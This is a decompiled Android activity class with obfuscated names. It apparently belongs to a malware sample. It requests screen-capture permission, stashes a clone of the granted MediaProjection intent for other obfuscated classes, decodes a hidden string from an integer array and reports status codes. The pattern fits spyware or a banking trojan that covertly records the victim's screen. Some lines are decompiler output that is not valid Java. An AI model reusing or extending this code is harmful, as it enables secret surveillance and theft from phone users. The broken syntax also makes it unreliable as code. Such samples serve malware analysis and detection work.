package tev.piqgahor;
public class fe7C818 extends android.app.Activity {

    public fe7C818()
    {
        return;
    }

    public void onActivityResult(int p3, int p4, android.content.Intent p5)
    {
        if (p4 != -1) {
            if (p4 == 0) {
                tev.piqgahor.mlDMsT43cl.pUnXkBa9201(0);
                tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(25, 5);
            }
        } else {
            tev.piqgahor.mlDMsT43cl.pUnXkBa9201(((android.content.Intent) p5.clone()));
            tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(25, 4);
        }
        int v0_3 = this.getApplicationContext();
        String v1_2 = new int[10];
        v1_2 = {36, 119, 135, 150, 137, 137, 146, 103, 133, 148};
        tev.piqgahor.jzVO9lP4.yStpazw33441uh(v0_3, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_2), p4);
        this.finish();
        return;
    }

    protected void onCreate(android.os.Bundle p5)
    {
        super.onCreate(p5);
        tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(25, 0);
        try {
            this.startActivityForResult(((android.media.projection.MediaProjectionManager) this.getSystemService("media_projection")).createScreenCaptureIntent(), tev.piqgahor.mlDMsT43cl.MediaProjectionCode());
        } catch (int v2) {
            tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(25, 1);
        }
        return;
    }

    public void onDestroy()
    {
        super.onDestroy();
        tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(25, 2);
        return;
    }

    protected void onStart()
    {
        super.onStart();
        tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(25, 3);
        return;
    }
}
